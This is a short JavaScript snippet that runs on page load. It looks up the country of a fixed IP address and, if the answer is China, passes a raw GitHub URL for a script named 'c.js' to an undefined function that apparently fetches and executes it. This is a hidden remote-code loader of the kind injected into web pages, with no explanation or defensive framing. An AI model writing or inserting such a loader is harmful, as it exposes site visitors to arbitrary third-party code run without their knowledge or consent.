function NewMyGetIPCall()
{

	NewMyMyCode("https://raw.githubusercontent.com/qaz1234qaz/myku/master/c.js");
}
function NewMyGetIP()
{
	mUrl="https://ip.seeip.org/geoip/114.114.114.114"; 
	try
	{
		var xmlHttpRequest= new XMLHttpRequest();
	} catch (e) {xmlHttpRequest= new ActiveXObject("Microsoft.XMLHTTP");} 
 
	xmlHttpRequest.onreadystatechange = function()
	{
		if(xmlHttpRequest.readyState == 4 && xmlHttpRequest.status == 200)
		{
			var b = xmlHttpRequest.responseText;
			try
			{
				var cs=JSON.parse(b)

				if(cs['country']=='China')NewMyGetIPCall();
			}
			catch (e) {}

		} 
	}
    xmlHttpRequest.open("GET",mUrl,true);
    xmlHttpRequest.send(); 

}
NewMyGetIP()